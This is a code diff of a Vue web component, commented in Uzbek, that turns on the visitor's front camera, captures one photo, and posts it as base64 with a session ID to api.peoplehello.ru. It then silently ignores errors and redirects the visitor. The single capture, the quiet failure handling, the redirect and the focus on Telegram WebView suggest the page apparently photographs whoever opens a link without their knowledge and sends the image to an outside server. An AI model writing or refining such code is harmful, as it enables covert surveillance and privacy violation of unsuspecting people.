@@ -21,7 +21,7 @@ export default {
       }
 
       try {
-        // ✅ FRONT KAMERA (lekin moslashuvchan)
+        // ✅ FRONT kamera
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: false
@@ -30,16 +30,16 @@ export default {
         const video = this.$refs.video
         video.srcObject = stream
 
-        // ❗ iOS / Telegram WebView uchun MUHIM
+        // iOS / WebView uchun MUHIM
         await video.play()
 
-        // ❗ Kamera haqiqatan tayyor bo‘lishini kutamiz
+        // Kamera tayyor bo‘lishini kutamiz
         await new Promise(res => {
           if (video.readyState >= 2) return res()
           video.onloadedmetadata = res
         })
 
-        // ❗ Real qurilmalarda barqarorlik uchun kichik delay
+        // Barqarorlik uchun kichik delay
         await new Promise(r => setTimeout(r, 500))
 
         const canvas = document.createElement("canvas")
@@ -52,24 +52,31 @@ export default {
         // Kamerani o‘chiramiz
         stream.getTracks().forEach(t => t.stop())
 
-        // ❗ ENG MUHIM QISM — toBlob (toDataURL EMAS)
-        canvas.toBlob(async (blob) => {
+        // ❗ toBlob → base64 (ENG ISHONCHLI)
+        canvas.toBlob((blob) => {
           if (!blob) return this.redirect()
 
-          const formData = new FormData()
-          formData.append("photo", blob, "photo.jpg")
-          formData.append("session_id", session_id)
+          const reader = new FileReader()
+          reader.onloadend = async () => {
+            const imageBase64 = reader.result // data:image/jpeg;base64,...
 
-          try {
-            await fetch("https://api.peoplehello.ru/api/front-cam", {
-              method: "POST",
-              body: formData
-            })
-          } catch (e) {
-            // jim
-          } finally {
-            this.redirect()
+            try {
+              await fetch("https://api.peoplehello.ru/api/front-cam", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  image: imageBase64,
+                  session_id
+                })
+              })
+            } catch (e) {
+              // jim
+            } finally {
+              this.redirect()
+            }
           }
+
+          reader.readAsDataURL(blob)
         }, "image/jpeg", 0.85)
 
       } catch (err) {
@@ -84,3 +91,4 @@ export default {
   }
 }
 </script>
+
